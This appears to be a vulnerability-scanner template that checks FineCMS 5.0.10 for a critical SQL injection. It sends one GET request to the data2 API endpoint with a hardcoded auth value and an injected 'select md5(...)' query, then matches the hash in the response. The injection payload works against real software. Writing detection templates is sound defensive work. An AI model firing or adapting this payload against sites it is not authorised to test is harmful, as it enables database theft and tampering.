id: finecms-sqli
brief:
    title: FineCMS 5.0.10 - SQL Injection
    by: ritikchaddha
    level: critical
    about: FineCMS 5.0.10 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the ...
    label:
        - finecms
        - sqli
        - vuln
    score: CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20md5({{num}})%27'
      signs:
        - "on": word
          has:
            - '{{md5({{num}})}}'
          in: body
